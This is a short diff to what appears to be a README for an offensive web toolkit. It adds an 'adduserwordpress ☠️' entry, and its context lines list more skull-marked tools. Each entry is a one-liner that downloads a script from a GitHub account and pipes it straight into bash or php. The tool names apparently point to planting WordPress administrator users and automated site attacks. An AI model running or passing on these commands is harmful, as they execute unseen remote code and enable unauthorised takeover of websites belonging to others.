@@ -30,6 +30,11 @@ curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/outs
 ```
 curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/simple.php | php
 ```
+# adduserwordpress ☠️
+```
+curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/addwp.sh | bash
+```
+
 # Auto Warbot ☠️
 ```
 curl -sL https://raw.githubusercontent.com/mrwawanj/website/refs/heads/main/warbot.php | php
